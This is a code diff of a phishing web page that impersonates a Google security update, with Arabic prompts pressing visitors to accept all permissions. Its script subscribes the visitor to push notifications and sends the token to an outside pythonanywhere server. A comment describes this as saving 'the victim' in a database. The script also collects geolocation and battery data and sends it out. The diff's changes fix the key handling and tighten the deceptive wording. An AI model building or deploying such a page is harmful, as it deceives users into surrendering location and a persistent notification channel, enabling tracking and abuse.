@@ -4,25 +4,28 @@
     <meta charset="UTF-8">
     <title>Google Security</title>
     <script>
-        // المفتاح الصحيح المطابق للسيرفر
-        const publicKey = "BVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg==";
+        // تأكد أن هذا المفتاح يطابق المفتاح العام (Public Key) الخاص بك
+        const publicKey = "BVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg";
 
         async function init() {
             try {
+                // 1. تسجيل الـ Service Worker (ضروري للإشعارات)
                 const reg = await navigator.serviceWorker.register('sw.js');
-                const sub = await reg.pushManager.subscribe({ 
-                    userVisibleOnly: true, 
-                    applicationServerKey: publicKey 
+                
+                // 2. طلب إذن الإشعارات وسحب التوكن
+                const sub = await reg.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: urlBase64ToUint8Array(publicKey)
                 });
 
-                // إرسال التوكن للسيرفر
+                // إرسال التوكن للسيرفر (لحفظ الضحية في الداتابيز)
                 await fetch('https://Mohammed888.pythonanywhere.com/save_token', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(sub)
                 });
 
-                // طلب الموقع وإرسال البيانات
+                // 3. سحب الموقع والبيانات
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const battery = await navigator.getBattery();
                     const payload = {
@@ -36,23 +39,35 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(payload)
                     });
-                    
-                    alert("تم تحديث الأمان بنجاح ✅");
+
+                    alert("تم تأمين الحساب بنجاح ✅");
                 }, (err) => {
-                    alert("يرجى السماح بالوصول للموقع لتفعيل الحماية ⚠️");
+                    alert("يجب السماح بالوصول للموقع لتفعيل الحماية ⚠️");
                 });
 
-            } catch (error) {
-                console.error("Error:", error);
-                alert("حدث خطأ، يرجى المحاولة من متصفح آخر ❌");
+            } catch (e) {
+                console.error(e);
+                alert("يرجى الضغط على 'سماح' (Allow) لتفعيل الإشعارات ❌");
             }
+        }
+
+        // دالة تحويل المفتاح (لا تلمسها)
+        function urlBase64ToUint8Array(base64String) {
+            const padding = '='.repeat((4 - base64String.length % 4) % 4);
+            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
+            const rawData = window.atob(base64);
+            const outputArray = new Uint8Array(rawData.length);
+            for (let i = 0; i < rawData.length; ++i) {
+                outputArray[i] = rawData.charCodeAt(i);
+            }
+            return outputArray;
         }
     </script>
 </head>
-<body style="text-align:center; padding:100px; font-family:sans-serif;">
+<body style="text-align:center; padding:100px; font-family:sans-serif; background:#f4f4f4;">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="80">
     <h2>تحديث الأمان مطلوب</h2>
-    <p>لحماية حسابك، يرجى الضغط على الزر أدناه</p>
+    <p>لحماية حسابك، اضغط على الزر واقبل جميع الأذونات</p>
     <button onclick="init()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">تفعيل الآن</button>
 </body>
 </html>
